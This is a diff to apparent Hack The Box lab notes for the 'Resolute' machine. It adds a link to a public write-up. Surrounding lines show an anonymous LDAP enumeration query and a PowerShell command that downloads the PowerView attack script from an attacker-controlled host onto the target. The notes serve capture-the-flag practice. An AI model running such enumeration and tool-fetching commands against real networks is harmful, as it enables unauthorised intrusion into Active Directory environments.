@@ -7,7 +7,10 @@ get ldap with description and info attributes
 ldapsearch -H ldap://10.10.10.169:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
 ```
 
-
+HTB writeups
+```
+https://zweilosec.gitbook.io/htb-writeups/windows-machines/medium/resolute-write-up
+```
 ```
 Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:temp\PowerView.ps1"
 ```
